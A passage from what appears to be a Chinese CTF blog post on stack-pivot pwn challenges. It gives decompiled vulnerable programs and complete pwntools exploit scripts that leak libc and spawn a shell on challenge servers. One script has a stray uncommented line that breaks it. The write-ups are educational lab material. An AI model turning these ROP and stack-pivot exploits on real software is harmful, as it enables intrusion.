<p>发送payload后，就会泄露libc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*8+p64(leave_ret+1)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)</span><br><span class="line">#system(/bin/sh)  leave_ret+1---&gt;retn用于堆栈平衡 </span><br><span class="line">payload =payload.ljust(0xd0,b&#x27;a&#x27;)#填充垃圾数据</span><br><span class="line">payload+=p64(stack_addr)+p64(leave_ret) #同理最终栈迁移执行shell</span><br></pre></td></tr></table></figure>



<h2 id="栈迁移到这里基本就总结结束啦～🌈✨😊"><a href="#栈迁移到这里基本就总结结束啦～🌈✨😊" class="headerlink" title="栈迁移到这里基本就总结结束啦～🌈✨😊"></a>栈迁移到这里基本就总结结束啦～🌈✨😊</h2><p>这里记录一个难的栈迁移</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Are you the king of stack migrate?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x90u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good luck.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0x90 - 0x80 &#x3D; 0x10典型的栈迁移,先给exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动远程连接</span></span><br><span class="line">io = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="number">30481</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">leave_ret = <span class="number">0x4011c8</span></span><br><span class="line"><span class="comment"># 快捷函数</span></span><br><span class="line">sa = <span class="keyword">lambda</span> a, b: io.sendafter(a, b)</span><br><span class="line">ru = <span class="keyword">lambda</span> a: io.recvuntil(a)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">inter = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x80</span></span><br><span class="line">padding = offset + <span class="number">0x8</span></span><br><span class="line">bss = <span class="number">0x404020</span> + <span class="number">0x500</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次栈迁移：将rbp劫持到bss段</span></span><br><span class="line">pay_pivot = cyclic(offset) + p64(bss + offset) + p64(<span class="number">0x40119e</span>)  <span class="comment"># read -&gt; bss+off</span></span><br><span class="line">sa(<span class="string">b&#x27;Are you the king of stack migrate?\n&#x27;</span>, pay_pivot)</span><br><span class="line">ru(<span class="string">b&#x27;Good luck.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment"># 泄露puts地址</span></span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="number">0x401146</span>, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>],     <span class="comment"># pop_rdi; puts_got; puts@plt</span></span><br><span class="line">    <span class="number">0x40112d</span>, bss + offset + <span class="number">0x200</span>, <span class="number">0x40119e</span>, <span class="comment"># pop_rbp; read -&gt; next stage</span></span><br><span class="line">    cyclic(<span class="number">0x50</span>),</span><br><span class="line">    bss - <span class="number">0x8</span>, leave_ret                      <span class="comment"># leave; ret</span></span><br><span class="line">)</span><br><span class="line">sd(payload)</span><br><span class="line">ru(<span class="string">b&#x27;Good luck.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析puts地址</span></span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造最终payload执行system(&quot;/bin/sh&quot;)</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    pop_rdi := <span class="number">0x401146</span>,</span><br><span class="line">    binsh_addr,</span><br><span class="line">    system_addr</span><br><span class="line">).ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(bss + <span class="number">0x200</span> - <span class="number">0x8</span>) + p64(<span class="number">0x4011c8</span>)  <span class="comment"># leave_ret</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里只有一个read函数，所以我们迁到栈上几乎是不可能的了，所以我们就想到迁到bss的段上</span><br></pre></td></tr></table></figure>

<p>这里把payload怎么构造和解题思路详细写一下。</p>
<p>解题思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先将栈迁到bss的段上，返回地址覆盖为read函数，再次读入时泄露puts的地址，返回地址依然为read,再次读入getshell。</span><br></pre></td></tr></table></figure>

<p>详细解释一下这个payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pay_pivot = cyclic(offset) + p64(bss + offset) + p64(<span class="number">0x40119e</span>)</span><br></pre></td></tr></table></figure>

<p>read_addr &#x3D; 0x40119e,rbp –&gt;p64(bss + offset),返回地址覆盖为read_addr(raed_addr后面有leave_ret)所以完成了，将栈迁移到bss + offset的位置进行读入。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = flat(</span><br><span class="line">    <span class="number">0x401146</span>, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>],     <span class="comment"># pop_rdi; puts_got; puts@plt</span></span><br><span class="line">    <span class="number">0x40112d</span>, bss + offset + <span class="number">0x200</span>, <span class="number">0x40119e</span>, <span class="comment"># pop_rbp; read -&gt; next stage</span></span><br><span class="line">    cyclic(<span class="number">0x50</span>),</span><br><span class="line">    bss - <span class="number">0x8</span>, leave_ret                      <span class="comment"># leave; ret</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p> 0x401146, elf.got[‘puts’], elf.plt[‘puts’]写了puts的地址的payload。</p>
<p> 0x40112d, bss + offset + 0x200, 0x40119e, # pop_rbp; read -&gt; next stage；利用pop_rbp再次利用read。</p>
<p>cyclic(0x50)–&gt;0x401146, elf.got[‘puts’], elf.plt[‘puts’]和0x40112d, bss + offset + 0x200, 0x40119e加在一起是0x30+0x50&#x3D;0x80。</p>
<p>bss - 0x8, leave_ret  ;将栈迁移到 bss - 0x8的位置。pop_rbp是怎么利用的呢，首先read读入这串payload后先执行 0x401146,     </p>
<p>elf.got[‘puts’], elf.plt[‘puts’]泄露puts的地址，然后pop_rbp。rbp就储存了bss+offset + 0x200的位置，接着执行0x40119e，从bss + offset + </p>
<p>0x200的位置开始read。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = flat(</span><br><span class="line">    pop_rdi := <span class="number">0x401146</span>,</span><br><span class="line">    binsh_addr,</span><br><span class="line">    system_addr</span><br><span class="line">).ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(bss + <span class="number">0x200</span> - <span class="number">0x8</span>) + p64(<span class="number">0x4011c8</span>)</span><br></pre></td></tr></table></figure>

<p>payload &#x3D; flat(<br>    pop_rdi :&#x3D; 0x401146,<br>    binsh_addr,<br>    system_addr<br>).ljust(0x80, b’\x00’)是构造system(&#x2F;bin&#x2F;sh) </p>
<p>payload +&#x3D; p64(bss + 0x200 - 0x8) + p64(0x4011c8)完成栈迁移。</p>
<h4 id="Black-Watch-入群题-PWN1"><a href="#Black-Watch-入群题-PWN1" class="headerlink" title="[Black Watch 入群题]PWN1"></a>[Black Watch 入群题]PWN1</h4><p>这题不难记录一下题目和exp就可以了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vul_function();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GoodBye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);   </span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200u</span>);  <span class="comment">//s在bss段上</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到远程服务</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27611</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境参数（架构、操作系统、日志等级）</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载本地 ELF 文件</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./spwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取程序中的符号地址</span></span><br><span class="line">write_plt = e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt = e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048513</span>  <span class="comment"># main 函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次发送 payload：泄露 write 的真实地址</span></span><br><span class="line">payload1 = <span class="string">b&#x27;aaaa&#x27;</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收输入提示</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造栈溢出 payload，覆盖返回地址，为下一次调用做准备</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p32(<span class="number">0x0804A300</span>) + p32(<span class="number">0x08048511</span>)  <span class="comment"># 0x0804A300 为 bss 段地址，0x08048511 为 level 函数返回地址</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收 write 的地址并解析</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&quot;Leaked write address: &quot;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 LibcSearcher 查找 libc 基址及 system 和 &quot;/bin/sh&quot; 地址</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - obj.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + obj.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次交互：发送调用 system(&quot;/bin/sh&quot;) 的 payload</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line">payload3 = <span class="string">b&#x27;aaaa&#x27;</span> + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次接收提示</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次构造栈溢出 payload，确保程序流正确执行</span></span><br><span class="line">payload4 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p32(<span class="number">0x0804A300</span>) + p32(<span class="number">0x08048511</span>)</span><br><span class="line">p.send(payload4)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入交互模式，获取 shell</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h4><p>这题不难也记录一下题目和exp就可以了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">96</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;锛積lcome to Stack bank,Tell me what you want&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x70u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!You can check and use your borrow stack now!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;bank, <span class="number">0x100u</span>LL);  <span class="comment">//bank在bss段</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到远程服务器</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25199</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境参数</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载 libc 和 程序的 ELF 文件</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 plt 和 got 中 puts 的地址</span></span><br><span class="line">puts_plt_addr = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常量地址定义</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x400703</span>  <span class="comment"># pop rdi; ret 指令的地址</span></span><br><span class="line">level_ret_addr = <span class="number">0x400699</span>  <span class="comment"># level 函数返回地址</span></span><br><span class="line">bss_addr = <span class="number">0x601080</span>  <span class="comment"># bss 段地址</span></span><br><span class="line">ret_addr = <span class="number">0x4004c9</span>  <span class="comment"># ret 指令地址</span></span><br><span class="line">main_addr = <span class="number">0x400626</span>  <span class="comment"># main 函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一个 payload：填充栈并跳转到 level_ret_addr</span></span><br><span class="line">payload1 = <span class="number">0x60</span> * <span class="string">b&#x27;a&#x27;</span> + p64(bss_addr) + p64(level_ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二个 payload：执行 ret 多次，然后调用 puts 泄露地址，并回到 main 函数</span></span><br><span class="line">payload2 = p64(ret_addr) * <span class="number">20</span>  <span class="comment"># 使用至少 20 个 ret 指令</span></span><br><span class="line">payload2 += p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr)  <span class="comment"># 调用 puts 泄露 puts 地址</span></span><br><span class="line">payload2 += p64(main_addr)  <span class="comment"># 返回到 main 函数</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收泄露的 puts 地址</span></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Leaked puts address: <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 libc 基地址和 shell 地址</span></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">shell = libc_base + <span class="number">0x4526a</span>   system(<span class="string">&quot;/bin/sh&quot;</span>) 地址</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Shell address: <span class="subst">&#123;<span class="built_in">hex</span>(shell)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三个 payload：覆盖返回地址为 shell 地址</span></span><br><span class="line">payload3 = <span class="number">0x60</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0xdeadbeef</span>) + p64(shell)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;u want\n&#x27;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收提示后发送 &#x27;1&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="Basectf2024-stack-in-stack"><a href="#Basectf2024-stack-in-stack" class="headerlink" title="Basectf2024 stack in stack"></a>Basectf2024 stack in stack</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_4011FE(a1, a2, a3);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It looks like something fell off mick0960.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x40u</span>LL) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;An error occurred while reading!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里主要利用了栈迁移，进行第一次泄露puts的地址，并且返回main。再次进行栈迁移，执行ROP链getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;It looks like something fell off mick0960.\n&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">main_addr = <span class="number">0x40124a</span></span><br><span class="line">leave = <span class="number">0x4012f2</span></span><br><span class="line">sub_4011C6 = <span class="number">0x4011dd</span>  <span class="comment">#泄露puts的地址</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(sub_4011C6) + p64(<span class="number">0</span>) + p64(main_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> </span><br><span class="line">payload += p64(buf_addr) + p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause() </span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;It looks like something fell off mick0960.\n&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause() </span></span><br><span class="line"> </span><br><span class="line">system = libc_base + libc.sym.system</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span> <span class="comment">#在libc.so.6找</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(buf_addr) + p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot;  #查找pop_rdi的偏移</span><br></pre></td></tr></table></figure>



<h4 id="SWPUCTF-2024-秋季新生赛-不可名状的东西"><a href="#SWPUCTF-2024-秋季新生赛-不可名状的东西" class="headerlink" title="[SWPUCTF 2024 秋季新生赛]不可名状的东西"></a>[SWPUCTF 2024 秋季新生赛]不可名状的东西</h4><p>栈迁移+ORW</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[128]; // [rsp+0h] [rbp-80h] BYREF</span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  puts(&quot;Please enter your name!&quot;);</span><br><span class="line">  read(0, buf, 0x98uLL);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0x98 - 0x80 -0x08 &#x3D; 16太短栈迁移</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动远程连接</span></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="number">23555</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">leave_ret = <span class="number">0x40120F</span></span><br><span class="line"><span class="comment"># 快捷函数</span></span><br><span class="line">sa = <span class="keyword">lambda</span> a, b: io.sendafter(a, b)</span><br><span class="line">ru = <span class="keyword">lambda</span> a: io.recvuntil(a)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">inter = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x80</span></span><br><span class="line">padding = offset + <span class="number">0x8</span></span><br><span class="line">bss = <span class="number">0x404020</span> + <span class="number">0x700</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次栈迁移：将rbp劫持到bss段</span></span><br><span class="line">pay_pivot = cyclic(offset) + p64(bss + offset) + p64(<span class="number">0x4011EF</span>)  <span class="comment"># read -&gt; bss+off</span></span><br><span class="line">sa(<span class="string">b&#x27;Please enter your name!\n&#x27;</span>, pay_pivot)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment"># 泄露puts地址</span></span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="number">0x4011C5</span>, <span class="number">0x404018</span>, <span class="number">0x401060</span>,     <span class="comment"># pop_rdi; puts_got; puts@plt</span></span><br><span class="line">    <span class="number">0x4011C8</span>, bss + offset + <span class="number">0x200</span>, <span class="number">0x4011EF</span>, <span class="comment"># pop_rbp; read -&gt; next stage</span></span><br><span class="line">    cyclic(<span class="number">0x50</span>),</span><br><span class="line">    bss - <span class="number">0x8</span>, leave_ret                      <span class="comment"># leave; ret</span></span><br><span class="line">)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析puts地址</span></span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造最终payload执行system(&quot;/bin/sh&quot;)</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(leave_ret+<span class="number">1</span>)+p64(leave_ret+<span class="number">1</span>)+p64(leave_ret+<span class="number">1</span>)+p64(<span class="number">0x4011C5</span>)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">payload =payload.ljust(<span class="number">0x80</span>,<span 